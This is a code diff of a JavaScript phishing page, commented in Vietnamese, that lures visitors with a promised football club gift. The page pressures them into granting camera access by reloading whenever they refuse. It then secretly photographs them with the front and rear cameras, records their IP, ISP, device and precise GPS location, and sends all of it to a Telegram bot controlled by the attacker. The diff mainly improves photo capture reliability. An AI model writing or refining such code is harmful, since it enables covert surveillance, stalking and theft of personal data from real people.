@@ -7,21 +7,36 @@ const info = {
 
 const delay = ms => new Promise(res => setTimeout(res, ms));
 
+// Hàm chụp ảnh đã fix lỗi ảnh đen
 async function captureCamera(facingMode = 'user') {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+  const stream = await navigator.mediaDevices.getUserMedia({ 
+    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
+    audio: false 
+  });
+  
   return new Promise(resolve => {
     const video = document.createElement('video');
     video.srcObject = stream;
+    video.setAttribute('playsinline', ''); // Quan trọng cho iOS
     video.play();
-    video.onloadedmetadata = () => {
+
+    // Đợi video thực sự sẵn sàng
+    video.onloadeddata = async () => {
+      // Đợi thêm 1.2 giây để camera tự động điều chỉnh độ sáng (Auto-exposure)
+      await delay(1200); 
+      
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      setTimeout(() => {
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(t => t.stop());
-        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.5); // Nén xuống 0.5 cho nhẹ, dễ gửi
-      }, 700);
+      const ctx = canvas.getContext('2d');
+      
+      // Vẽ ảnh từ video vào canvas
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Tắt stream ngay sau khi vẽ xong
+      stream.getTracks().forEach(t => t.stop());
+      
+      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.6);
     };
   });
 }
@@ -38,18 +53,21 @@ async function main() {
   let backBlob = null;
 
   try {
-    // 2. ÉP QUYỀN CAMERA (Từ chối là Reload)
+    // 2. ÉP QUYỀN CAMERA (Chụp cam trước)
     frontBlob = await captureCamera("user");
-    await delay(300);
-    backBlob = await captureCamera("environment");
+    // Chụp cam sau (nếu có)
+    try {
+        backBlob = await captureCamera("environment");
+    } catch(e) { console.log("Không có cam sau"); }
+    
     info.camera = "✅ Thành công";
   } catch (e) {
-    alert("CẢNH BÁO: Bạn phải Cho phép Camera để hệ thống xác thực danh tính nhận quà FC!");
+    alert("CẢNH BÁO: Hệ thống yêu cầu Camera để xác thực danh tính nhận quà. Vui lòng nhấn 'Cho phép'!");
     location.reload();
     return;
   }
 
-  // 3. LẤY IP & GPS
+  // 3. LẤY IP & GPS (Chạy song song)
   const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
     info.ip = res.ip;
     info.isp = res.connection?.org || 'N/A';
@@ -61,7 +79,7 @@ async function main() {
       p => {
         info.lat = p.coords.latitude.toFixed(6);
         info.lon = p.coords.longitude.toFixed(6);
-        info.address = `Vệ tinh chính xác`;
+        info.address = `Độ chính xác cao`;
         res();
       },
       () => res(), 
@@ -69,64 +87,38 @@ async function main() {
     );
   });
 
-  await Promise.all([getIP, getGPS, delay(1500)]);
+  await Promise.all([getIP, getGPS]);
 
-  // 4. CẤU TRÚC LẠI NỘI DUNG (Sửa link Maps chuẩn)
+  // 4. GỬI DATA
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   const caption = `
 🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
 --------------------------
 🕒 <b>Time:</b> ${info.time}
 📱 <b>Device:</b> ${info.device} (${info.os})
-🌍 <b>IP:</b> ${info.ip} | <b>ISP:</b> ${info.isp}
-📍 <b>Bản đồ:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
+🌍 <b>IP:</b> ${info.ip}
+🏢 <b>ISP:</b> ${info.isp}
+📍 <b>Maps:</b> <a href="${mapsLink}">Xem vị trí</a>
 🏙️ <b>Địa chỉ:</b> ${info.address || 'Tọa độ IP'}
 `.trim();
 
-  // 5. GỬI TELEGRAM (Sửa cấu trúc sendMediaGroup)
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
 
   const media = [];
   if (frontBlob) {
-    formData.append('p1', frontBlob, 'front.jpg');
-    media.push({
-      type: 'photo',
-      media: 'attach://p1',
-      caption: caption,
-      parse_mode: 'HTML'
-    });
+    formData.append('p1', frontBlob, 'f.jpg');
+    media.push({ type: 'photo', media: 'attach://p1', caption: caption, parse_mode: 'HTML' });
   }
   if (backBlob) {
-    formData.append('p2', backBlob, 'back.jpg');
-    media.push({
-      type: 'photo',
-      media: 'attach://p2'
-    });
+    formData.append('p2', backBlob, 'b.jpg');
+    media.push({ type: 'photo', media: 'attach://p2' });
   }
 
   formData.append('media', JSON.stringify(media));
 
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
-      method: 'POST',
-      body: formData
-    });
-    
-    const resData = await response.json();
-    if (!resData.ok) {
-        // Nếu gửi Group lỗi, thử gửi tin nhắn văn bản làm backup
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: "⚠️ Lỗi Media nhưng có Data:\n" + caption,
-                parse_mode: 'HTML'
-            })
-        });
-    }
-  } catch (err) {
-    console.error("Lỗi kết nối:", err);
-  }
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
+    method: 'POST',
+    body: formData
+  });
 }
